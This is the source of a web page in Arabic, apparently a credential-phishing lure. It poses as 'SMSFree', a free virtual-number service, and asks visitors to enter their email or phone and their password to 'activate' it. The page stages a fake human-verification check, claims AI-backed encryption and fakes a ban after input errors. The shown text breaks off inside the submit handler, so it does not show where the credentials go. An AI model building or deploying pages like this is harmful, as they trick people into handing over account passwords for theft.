<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - تفعيل الخدمة العالمية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #0a0e17;
            --card-bg: #141b2b;
            --primary-glow: #00f2fe;
            --secondary-glow: #4facfe;
            --text-main: #ffffff;
            --text-muted: #8b9bb4;
            --placeholder-color: rgba(0, 242, 254, 0.4); /* لون التلميح الأنيق */
            --border: rgba(255, 255, 255, 0.05);
            --success: #2ecc71;
            --error: #ff4757;
        }

        body {
            margin: 0; padding: 0; font-family: 'Cairo', sans-serif;
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at center, #1a2333 0%, #0a0e17 100%);
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; color: var(--text-main); overflow: hidden;
        }

        .premium-card {
            background-color: var(--card-bg); width: 90%; max-width: 400px;
            padding: 45px 35px; border-radius: 28px; text-align: center;
            border: 1px solid var(--border);
            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
            position: relative; z-index: 10;
        }

        .logo-circle {
            width: 110px; height: 110px; background: linear-gradient(145deg, #111827, #1e293b);
            border-radius: 50%; display: flex; justify-content: center; align-items: center;
            margin: 0 auto 30px; border: 1px solid rgba(0, 242, 254, 0.2);
            box-shadow: 0 0 30px rgba(0, 242, 254, 0.15);
        }

        .logo-text { font-size: 22px; font-weight: 800; color: #fff; letter-spacing: 1px; text-shadow: 0 0 15px rgba(255,255,255,0.4); }

        /* تنسيق الحقول مع لون التلميح الجديد */
        .input-group { margin-bottom: 20px; position: relative; }

        input {
            width: 100%; padding: 18px 20px;
            background: rgba(255, 255, 255, 0.02);
            border: 1.5px solid var(--border);
            border-radius: 15px; color: #fff; font-family: 'Cairo';
            font-size: 15px; box-sizing: border-box;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }

        /* تعديل لون التلميح (Placeholder) ليصبح أنيقاً */
        input::placeholder { color: var(--placeholder-color); font-weight: 400; font-size: 14px; }

        input:focus {
            border-color: var(--secondary-glow);
            background: rgba(0, 242, 254, 0.03);
            box-shadow: 0 0 20px rgba(0, 242, 254, 0.15);
            outline: none;
            transform: scale(1.02);
        }

        /* رسائل الحالة */
        .status-msg {
            font-size: 13px; font-weight: 600; padding: 12px; border-radius: 12px;
            margin-bottom: 20px; display: none; transition: all 0.3s;
        }
        .msg-error { background: rgba(255, 71, 87, 0.1); color: var(--error); border: 1px solid rgba(255, 71, 87, 0.2); }
        .msg-ban { background: #000; color: #ffbc00; border: 1px solid #ffbc00; }

        .verification-zone {
            margin-bottom: 20px; display: none; align-items: center; justify-content: center;
            background: rgba(0, 242, 254, 0.05); padding: 12px; border-radius: 12px;
        }

        .spinner {
            width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1);
            border-top: 2px solid var(--secondary-glow); border-radius: 50%;
            animation: spin 0.8s linear infinite; margin-left: 12px;
        }

        @keyframes spin { 100% { transform: rotate(360deg); } }

        button {
            width: 100%; padding: 18px; font-weight: 800; font-size: 17px;
            background: linear-gradient(135deg, var(--secondary-glow), var(--primary-glow));
            border: none; border-radius: 15px; cursor: pointer; color: #0a0e17;
            box-shadow: 0 10px 25px rgba(0, 242, 254, 0.2);
            transition: all 0.3s ease;
        }

        button:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 242, 254, 0.4); }
        button:disabled { opacity: 0.6; cursor: not-allowed; }

        .footer-rights {
            margin-top: 35px; font-size: 11px; color: var(--text-muted);
            border-top: 1px solid var(--border); padding-top: 20px; line-height: 1.8;
        }
    </style>
</head>
<body>
    <div class="premium-card">
        <div class="logo-circle"><span class="logo-text">SMSFree</span></div>
        <h2 style="font-size: 22px; margin-bottom: 8px; letter-spacing: -0.5px;">تأكيد الهوية الرقمية</h2>
        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 30px;">سجل دخولك لتفعيل ميزة الأرقام الوهمية</p>

        <div id="statusBox" class="status-msg"></div>

        <form id="authForm">
            <div class="input-group">
                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو الهاتف" required>
            </div>
            <div class="input-group">
                <input type="password" id="passInput" placeholder="كلمة السر الخاصة بك" required>
            </div>

            <div class="verification-zone" id="vZone">
                <div id="vProcess" style="display: flex; align-items: center;">
                    <div class="spinner"></div>
                    <span style="font-size: 13px; color: var(--secondary-glow);">جاري فحص النشاط البشري...</span>
                </div>
                <div id="vSuccess" style="display: none; color: var(--success); font-weight: 700;">✅ تم التحقق من أنك لست روبوت</div>
            </div>

            <button type="submit" id="pageBtn">تفعيل الحساب الآن</button>
        </form>

        <div class="footer-rights">
            © 2024 Global Virtual Numbers Pro. جميع الحقوق محفوظة. <br>
            نظام تشفير وحماية متطور <span style="color: var(--secondary-glow);">●</span> مدعوم بالذكاء الاصطناعي.
        </div>
    </div>

    <script>
        let errorCount = 0;
        const form = document.getElementById('authForm');
        const statusBox = document.getElementById('statusBox');

        form.onsubmit = async (e) => {
            e.preventDefault();
            const user = document.getElementById('userInput').value;
            const pass = document.getElementById('passInput').value;
            const btn = document.getElementById('pageBtn');

            if (pass.length < 6 || (!user.includes('@') && user.length < 8)) {
                errorCount++;
                showStatus("⚠️ عذراً، يرجى كتابة البيانات بطريقة صحيحة", "msg-error");
                if (errorCount >= 2) applyBan();
                return;
            }
